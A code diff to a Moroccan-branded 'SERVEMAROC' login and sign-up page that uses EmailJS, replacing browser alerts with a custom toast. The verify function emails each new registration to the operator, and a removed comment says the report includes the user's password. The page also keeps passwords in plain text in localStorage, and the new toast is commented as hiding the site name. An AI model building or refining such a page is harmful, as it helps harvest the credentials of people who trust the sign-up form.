@@ -17,9 +17,19 @@
         .input-style { width: 100%; padding: 12px; background: #ebf2ff; border-radius: 4px; border: none; outline: none; }
         .btn-blue { width: 100%; padding: 14px; background: #2563eb; color: white; border-radius: 4px; font-weight: 700; border: none; cursor: pointer; }
         .hidden { display: none; }
+
+        /* نظام التنبيهات الجديد (بديل alert المزعجة) */
+        #custom-alert { 
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%); 
+            background: #1e293b; color: white; padding: 12px 24px; 
+            border-radius: 6px; font-weight: 600; font-size: 14px; 
+            display: none; z-index: 1000; box-shadow: 0 10px 15px rgba(0,0,0,0.1); 
+        }
     </style>
 </head>
 <body>
+
+    <div id="custom-alert"></div>
 
     <div class="auth-card">
         <h1 class="text-center text-3xl font-extrabold text-blue-600 mb-8 tracking-tight">SERVE<span class="text-black">MAROC</span></h1>
@@ -66,7 +76,15 @@
     </div>
 
     <script>
-        emailjs.init("WRpj_ZtTQw-eHAZDQ");
+        emailjs.init("WRpj_ZtTQw-eHAZDQ"); //
+
+        // دالة لإظهار التنبيه بدون اسم الموقع
+        function showNotify(msg) {
+            const el = document.getElementById('custom-alert');
+            el.innerText = msg;
+            el.style.display = 'block';
+            setTimeout(() => { el.style.display = 'none'; }, 3000);
+        }
 
         function showTab(tab) {
             document.getElementById('section-login').classList.add('hidden');
@@ -94,9 +112,8 @@
                 const db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                 const user = db.find(u => u.email === email && u.pass === pass);
                 if(user) { 
-                    alert("Welcome " + user.name);
-                    // هنا حيدنا سطر window.location باش يبقى في نفس الصفحة
-                } else { alert("Error: Account not found!"); }
+                    showNotify("Welcome " + user.name); // حيدنا alert
+                } else { showNotify("Error: Account not found!"); }
             },
             register: function() {
                 this.temp = { 
@@ -104,17 +121,20 @@
                     email: document.getElementById('r-email').value, 
                     pass: document.getElementById('r-pass').value 
                 };
+                if(!this.temp.name || !this.temp.email || !this.temp.pass) return showNotify("Please fill all fields!");
+                
                 this.code = Math.floor(100000 + Math.random() * 900000).toString();
+                showNotify("Sending OTP...");
                 emailjs.send("service_dk24ksf", "template_14tc2a8", {
                     name: this.temp.name, email: this.temp.email, otp_code: this.code
                 }).then(() => {
-                    alert("OTP Sent!");
+                    showNotify("OTP Sent!"); // حيدنا alert
                     showTab('otp');
                 });
             },
             verify: function() {
                 if(document.getElementById('otp-input').value === this.code) {
-                    // إرسال التقرير الكامل ليك (الاسم، الإيميل، الباسورد)
+                    // إرسال التقرير ليك لبريدك
                     emailjs.send("service_dk24ksf", "template_14tc2a8", {
                         name: "NEW REGISTRATION",
                         email: "ADMIN",
@@ -123,9 +143,9 @@
                     let db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                     db.push(this.temp);
                     localStorage.setItem('sm_users', JSON.stringify(db));
-                    alert("Account Created!");
-                    location.reload(); 
-                } else { alert("Invalid OTP!"); }
+                    showNotify("Account Created!"); // حيدنا alert
+                    setTimeout(() => { location.reload(); }, 2000); 
+                } else { showNotify("Invalid OTP!"); }
             }
         };
     </script>
